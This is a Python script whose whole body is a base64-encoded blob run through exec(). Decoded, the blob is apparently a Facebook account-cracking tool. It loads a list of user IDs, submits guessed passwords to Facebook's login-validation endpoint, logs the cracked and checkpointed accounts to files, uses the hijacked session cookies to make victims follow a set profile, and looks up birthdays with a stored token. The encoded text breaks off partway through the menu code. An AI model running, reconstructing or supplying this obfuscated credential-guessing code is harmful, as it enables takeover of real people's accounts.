import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KaW1wb3J0IHRpbWUNCmltcG9ydCByYW5kb20NCmltcG9ydCBqc29uDQppbXBvcnQgc3RyaW5nDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBiczQNCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KIyMjLS0tLS0tLS0tLVsgSU1QT1JUIExJQlJBUlkgXS0tLS0tLS0tLS0gIyMjDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBiczQNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHRpbWUNCmltcG9ydCByZQ0KaW1wb3J0IGpzb24NCmltcG9ydCB1dWlkDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHJpY2gNCmltcG9ydCBzaHV0aWwNCmltcG9ydCB3ZWJicm93c2VyDQpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludA0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXINCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGUNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwIGFzIGplZGENCiMgZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBwcmludGVyDQojIGZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwNCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZQ0KDQppbXBvcnQgb3MNCnRyeToNCiAgICBpbXBvcnQgcmVxdWVzdHMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyByZXF1ZXN0cyAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGZ1dHVyZXMgIS4uLlxuJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCg0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgb3MNCmltcG9ydCByZQ0KaW1wb3J0IGJzNA0KaW1wb3J0IHBsYXRmb3JtDQppbXBvcnQgc3lzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCByYW5kb20NCmltcG9ydCBkYXRldGltZQ0KaW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCB0aHJlYWRpbmcNCmltcG9ydCBpdGVydG9vbHMNCmltcG9ydCBiYXNlNjQNCmltcG9ydCB1dWlkDQppbXBvcnQgemxpYg0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBhaG1hZHMNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyBqZWRhDQoNCg0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbiA9IFsnSmFudWFyeScsICdGZWJydWFyeScsICdNYXJjaCcsICdBcHJpbCcsICdNYXknLCAnSnVuZScsDQogICAgICAgICAnSnVseScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPY3RvYmVyJywgJ05vdmVtYmVyJywgJ0RlY2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCm9wID0gYnVsYW5bblRlbXBdDQpQID0gJ1x4MWJbMTs5N20nDQpNID0gJ1wwMzNbMTszMW0nDQpIID0gJ1wwMzNbMTszMm0nDQpLID0gJ1x4MWJbMTs5N20nDQpCID0gJ1x4MWJbMTs5N20nDQpVID0gJ1x4MWJbMTs5N20nDQpPID0gJ1x4MWJbMTs5N20nDQpOID0gJ1x4MWJbMG0nICAgICMNCm15X2NvbG9yID0gWw0KICAgIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpkYXRhLCBkYXRhMiA9IHt9LCB7fQ0KYW1hbiwgY3AsIHNhbGFoID0gMCwgMCwgMA0KdWJhaFAsIGZ1Y2ssIHB3QmFydSA9IFtdLCBbXSwgW10NCkFwayA9IFtdDQpvayA9IFtdDQpjcCA9IFtdDQppZCA9IFtdDQp1c2VyID0gW10NCmxvb3AgPSAwDQp1cmxfbG9va3VwID0gImh0dHBzOi8vbG9va3VwLWlkLmNvbS8iDQp1cmxfbWIgPSAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIg0KdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIg0KaGVhZGVyX2dydXAgPSB7DQogICAgIk1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTVfNSBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTUuNCBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMSBbRkJBTi9GQklPUztGQkRWL2lQaG9uZTEyLDE7RkJNRC9pUGhvbmU7RkJTTi9pT1M7RkJTVi8xMy40LjE7RkJTUy8yO0ZCSUQvcGhvbmU7RkJMQy9lbl9VUztGQk9QLzVdIn0NCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSmFudWFyeSIsICIwMiI6ICJGZWJydWFyeSIsICIwMyI6ICJNYXJjaCIsICIwNCI6ICJBcHJpbCIsICIwNSI6ICJNYXkiLCAiMDYiOiAiSnVuZSIsDQogICAgICAgICAgICAgIjA3IjogIkp1bHkiLCAiMDgiOiAiQXVndXN0dXMiLCAiMDkiOiAiU2VwdGVtYmVyIiwgIjEwIjogIk9jdG9iZXIiLCAiMTEiOiAiTm92ZW1iZXIiLCAiMTIiOiAiRGVjZW1iZXIifQ0KZG9uZSA9IEZhbHNlDQpkZWYgamFsYW4oeik6DQogICAgZm9yIGUgaW4geiArICdcbic6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkNCmRlZiBsb2FkaW5nKCk6DQogICAgYW5pbWF0aW9uID0gWyJbXHgxYlsxOzkxbcOi4oCTwqBceDFiWzBtw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqHDouKAk8KhXSIsIltceDFiWzE7OTJtw6LigJPCoMOi4oCTwqBceDFiWzBtw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OTNtw6LigJPCoMOi4oCTwqDDouKAk8KgXHgxYlswbcOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OTRtw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoFx4MWJbMG3DouKAk8Khw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OTVtw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqBceDFiWzBtw6LigJPCocOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OTZtw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8KgXHgxYlswbcOi4oCTwqHDouKAk8Khw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OTdtw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoFx4MWJbMG3DouKAk8Khw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OThtw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqBceDFiWzBtw6LigJPCocOi4oCTwqFdIiwgIltceDFiWzE7OTltw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8KgXHgxYlswbcOi4oCTwqFdIiwgIltceDFiWzE7OTEwbcOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqDDouKAk8Kgw6LigJPCoMOi4oCTwqBceDFiWzBtXSJdDQogICAgZm9yIGkgaW4gcmFuZ2UoNTApOg0KICAgICAgICB0aW1lLnNsZWVwKDAuMSkNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIHtOfVt7SH3DouKCrMKie059XSB7SH1Mb2FkaW5nLi4ue059ICIgKyBhbmltYXRpb25baSAlIGxlbihhbmltYXRpb24pXSArIlx4MWJbMG0gIikNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICANCmxvZ28gPSIiIlwwMzNbMTs5Mm0NClwwMzNbMTszMW0gIF9fICBfXyAgICAgICAgICBfICAgICAgICAgICAgICAgXyAgIF8gIF9fX19fIA0KXDAzM1sxOzMybSB8ICBcLyAgfCAgIC9cICAgfCB8ICAgICAgICAvXCAgIHwgXCB8IHwvIF9fX198DQpcMDMzWzE7MzNtIHwgXCAgLyB8ICAvICBcICB8IHwgICAgICAgLyAgXCAgfCAgXHwgfCB8ICBfXyANClwwMzNbMTszNG0gfCB8XC98IHwgLyAvXCBcIHwgfCAgICAgIC8gL1wgXCB8IC4gYCB8IHwgfF8gfA0KXDAzM1sxOzM1bSB8IHwgIHwgfC8gX19fXyBcfCB8X19fXyAvIF9fX18gXHwgfFwgIHwgfF9ffCB8DQpcMDMzWzE7MzZtIHxffCAgfF8vXy8gICAgXF9cX19fX19fL18vICAgIFxfXF98IFxffFxfX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANClwwMzNbMTszMm0o4oiaKT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQ0KXDAzM1sxOzM2bSAgICBPd25lciAgOiAgU0FISUwgUFJJTkNFDQpcMDMzWzE7OTJtICAgIEdpdGh1YiA6ICBNQUxBTkctWUFSIA0KXDAzM1sxOzM2bSAgICAgRkIgICAgOiAgTWFsYW5nZGlqYW4NClwwMzNbMTszNG0gICAgQ29udGFjdDogIDAzMDE0NTQwNTAwDQpcMDMzWzE7MzZtICAgIFZlcnNpb246ICAxLjINClwwMzNbMTs5MW0gICAgIEJ5ZXBhc3MgIEthcm5lIFdhbHkgIERpIE1hIE5vIExhbg0KXDAzM1sxOzMybSjiiJopPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIiIiAgIA0KZGVmIGhhc2lsKE9LLCBjcCk6DQogICAgaWYgbm90IGxlbihPSykgIT0gMDoNCiAgICAgICAgcGFzcw0KICAgIGlmIGxlbihjcCkgIT0gMDoNCiAgICAgICAgcHJpbnQoJ1xuXG5ceDFiWzE7OTdtIFRvdGFsIE9LIDogXHgxYlsxOzk3bSAlcyAgXHgxYlsxOzk3bU9LLnR4dCcgJSAoDQogICAgICAgICAgICBILCBQLCBzdHIobGVuKG9rKSkpKQ0KICAgICAgICBwcmludCgnXHgxYlsxOzk3bSBUb3RhbCBDUCA6XHgxYlsxOzk3bSAgICVzIFx4MWJbMTs5N21DUC50eHQnICUNCiAgICAgICAgICAgICAgKEgsIFAsIHN0cihsZW4oY3ApKSkpDQogICAgICAgIGlucHV0KCJceDFiWzE7OTdtUHJlc3MgZW50ZXIgdG8gYmFjayAgIikNCiAgICAgICAgYWhtYWQoKSAgIA0KZGVmIGFobWFkKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBpcG0gPSByZXF1ZXN0cy5nZXQodXJsX2lwKS5qc29uKCkNCiAgICB0b2R6ID0gJycNCiAgICBJUCA9IGlwbVsnb3JpZ2luJ10NCiAgICBwcmludCgnXDAzM1sxOzMzbVsxXSBGaWxlIENsb25pbmcnKQ0KICAgIHByaW50KCdbRV0gRXhpdCcpDQogICAgcHJpbnQoJycpDQogICAgX2FobWFkX19fID0gaW5wdXQoJ1wwMzNbMTszNm0gICAgICAgQ2hvb3NlIG9wdGlvbiA6ICcpDQogICAgaWYgX2FobWFkX19fIGluICgnMScsICcwMScpOiAgICAgDQogICAgICAgIF9fQUpBQUFfXygpLm1hbGlreChpZCkNCiAgICBpZiBfYWhtYWRfX18gaW4gKCdFJywgJ2VlJyk6DQogICAgICAgIHBhc3MNCg0KDQoNCmNsYXNzIF9fQUpBQUFfXzoNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIHNlbGYuaWQgPSBbXQ0KICAgIGRlZiBtYWxpa3goc2VsZixpZCk6DQogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICBwcmludChsb2dvKQ0KICAgICAgICBzZWxmLmNudCA9IGlucHV0KCdcMDMzWzE7OTJtIEVudGVyIEZpbGUgTmFtZSA6XDAzM1sxOzkybSAnKQ0KICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgcHJpbnQoIiIpDQogICAgICAgIF9fX3dvcmxkd2lkZV9fXyA9ICgneScpDQogICAgICAgIGlmIF9fX3dvcmxkd2lkZV9fXyBpbiAoJ3llcycsJ1llcycsJ1knLCAneScpOg0KIyAgICAgICAgICAgIHNlbGYuX19va19fKCkNCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ2hvb3NlIENvcnJlY3QgT25lJyk7DQogICAgICAgICAgICBzZWxmLmFobWFkeChpZCkNCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6DQogICAgICAgIGdsb2JhbCBvayxjcCxsb29wDQoNCiAgICAgICAgYW5pbWFzaSA9IHJhbmRvbS5jaG9pY2UoWyJceDFiWzE7OTJtW01BTEFORy1ZQVJdIiwiXHgxYlsxOzkybVtNQUxBTkctWUFSXSIsIlx4MWJbMTs5Mm1bTUFMQU5HLVlBUl0iLCJceDFiWzE7OTJtW01BTEFORy1ZQVJdIiwiXHgxYlsxOzkybVtNQUxBTkctWUFSXSIsIlx4MWJbMTs5Mm1bTUFMQU5HLVlBUl0iLCJceDFiWzE7OTJtW01BTEFORy1ZQVJdIl0pDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcciB7Tn17YW5pbWFzaX0ge059e2xvb3B9e059L3tNfXtsZW4oc2VsZi5pZCl9IHtOfVt7SH1PSzp7bGVuKG9rKX17Tn1dW3tCfUNQOntsZW4oY3ApfXtCfV0gW3tIfXsnezouMSV9Jy5mb3JtYXQobG9vcC9mbG9hdChsZW4oc2VsZi5pZCkpKX17Tn1dIikNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOg0KICAgICAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgICAgICBoZWFkZXI9ew0KICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2Vib2ssDQogICAgICAgICAgICAgICAgICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfOV8zKSBBcHBsZVdlYktpdC81MzcuNzUuMTQgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzcuMC4zIFNhZmFyaS83MDQ2QTE5NEEiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwNCiAgICAgICAgICAgICAgICAgICAgImRudCI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsDQogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly9mcmVlLmZhY2Vib29rLmNvbS8iLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSwgYnIiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tVVMsZW47cT0wLjkiDQogICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpDQogICAgICAgICAgICAgICAgZGFzID0gew0KICAgICAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgInVpZCI6dXNlciwNCiAgICAgICAgICAgICAgICAgICAgImZsb3ciOiJsb2dpbl9ub19waW4iLA0KICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsDQogICAgICAgICAgICAgICAgICAgICJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7DQogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywNCiAgICAgICAgICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF85XzMpIEFwcGxlV2ViS2l0LzUzNy43NS4xNCAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNy4wLjMgU2FmYXJpLzcwNDZBMTk0QSIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ImRvY3VtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL2ZyZWUuZmFjZWJvb2suY29tLyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlLCBiciIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1VUyxlbjtxPTAuOSINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcG8gPSBzZXNzaW9uLnBvc3QoZiJodHRwczovL3tjZWJva30vbG9naW4vZGV2aWNlLWJhc2VkL3ZhbGlkYXRlLXBhc3N3b3JkLz9zaGJsPTAiLCBkYXRhID0gZGFzLCBoZWFkZXJzID0gaGVhZGVyMSwgYWxsb3dfcmVkaXJlY3RzID0gRmFsc2UpDQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgICAgIGNvb3ogPSBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKQ0KICAgICAgICAgICAgICAgICAgICBjb2tpID0gJ2RhdHI9JyArIGNvb3pbJ2RhdHInXSArICc7JyArICgnY191c2VyPScgKyBjb296WydjX3VzZXInXSkgKyAnOycgKyAoJ2ZyPScgKyBjb296WydmciddKSArICc7JyArICgneHM9JyArIGNvb3pbJ3hzJ10pDQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH0gW09LLU1BTEFORy1ZQVJdIHt1c2VyfSB8IHtwd30iKSAgIA0KICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgIG9rLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgIGNla19hcGsoc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdNQUxBTkctWUFSX09LLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW56ID0gb3BlbignLnRva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY3BfdHRsID0gc2Vzc2lvbi5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dXNlcn0/ZmllbGRzPWJpcnRoZGF5JmFjY2Vzc190b2tlbj17dG9rZW56fScpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNwX3R0bC5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCA9IGJ1bGFuX3R0bFttb250aF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHIge1B9IFtDUC1NQUxBTkctWUFSXSAgICAgICAgICAgICAgIFxuIFVTRVJOQU1FfHwgIHt1c2VyfSAgICAgXG4gUEFTU1dPUkR8fCB7cHd9IikNCiAgICAgICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCdNQUxBTkctWUFSX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgZGF5ICAgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyBbQ1AtTUFMQU5HLVlBUl0gJXMgfCAlcyAnICUgKE0sIHVzZXIsIHB3KSkNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdNQUxBTkctWUFSX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQ0KICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4MTUzMDEwNjIyMicsIGNvb2tpZXM9eydjb29raWUnOiBjb2tpfSkudGV4dCwgJ2h0bWwucGFyc2VyJykNCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgc3RyaW5nPSdJa3V0aScpLmdldCgnaHJlZicpDQogICAgICAgIHNlc3Npb24uZ2V0KCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSksIGNvb2tpZXM9eydjb29raWUnOiBjb2tpfSkudGV4dA0KDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICBwcmludCgnXDAzM1sxOzkybVsxXSBcMDMzWzE7OTZtQ3JhY2sgQXV0byBQYXNzICcpDQogICAgICAgIHByaW50KA0KICAgICAgICAgICAgJ1wwMzNbMTs5Mm1bMl0gXDAzM1sxOzk2bUNyYWNrIERpZ2l0IFBhc3N3b3JkcycpDQogICAgICAgIHByaW50KA0KICAgICAgICAgICAgJ1wwMzNbMTs5Mm1bM10gXDAzM1sxOzk2bUNyYWNrIE5hbWUgKyBEaWdpdCBQYXNzICcpDQogICAgICAgIHByaW50KA0KICAgICAgICAgICAgJ1wwMzNbMTs5Mm1bNF0gXDAzM1sxOzk2bUNyYWNrIFdpdGggZmlyc3QgbGFzdCBhbmQgZnVsbG5hbWUgUGFzcyAnKQ0KICAgICAgICBwcmludCgnXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCiAgICAgICAgY2hpID0gaW5wdXQoJ1wwMzNbMTs5Mm1b4oCiXSBcMDMzWzE7OTdtQ2hvb3NlIDogXDAzM1sxOzkybScpDQogICAgICAgIGlmIGNoaSA9